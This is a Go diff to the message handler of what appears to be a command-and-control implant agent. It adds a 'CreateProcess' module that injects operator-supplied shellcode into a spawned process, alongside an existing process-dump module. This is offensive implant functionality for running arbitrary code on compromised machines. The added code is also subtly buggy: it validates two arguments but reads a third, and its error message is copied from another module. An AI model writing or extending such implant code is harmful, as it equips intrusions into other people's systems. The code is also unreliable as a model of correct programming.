@@ -699,8 +699,7 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 				message("note", "FileTransfer type: Download")
 			}
 
-			d, _ := filepath.Split(p.FileLocation)
-			_, directoryPathErr := os.Stat(d)
+			_, directoryPathErr := os.Stat(filepath.Dir(p.FileLocation))
 			if directoryPathErr != nil {
 				c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
 					"directory %s:\r\n", p.FileLocation)
@@ -779,6 +778,24 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 		p := m.Payload.(messages.Module)
 		c.Job = p.Job
 		switch p.Command {
+		case "CreateProcess":
+			if a.Verbose {
+				message("note", "Received CreateProcess request")
+			}
+			//ensure the provided args are valid
+			if len(p.Args) < 2 {
+				//not enough args
+				c.Stderr = "not enough arguments provided to the createProcess module to dump a process"
+				break
+			}
+			var err error
+			// 1. Shellcode
+			// 2. SpawnTo Executable
+			// 3. SpawnTo Arguments
+			c.Stdout, c.Stderr, err = ExecuteShellcodeCreateProcessWithPipe(p.Args[0], p.Args[1], p.Args[2])
+			if err != nil {
+				c.Stderr = err.Error()
+			}
 		case "Minidump":
 			if a.Verbose {
 				message("note", "Received Minidump request")
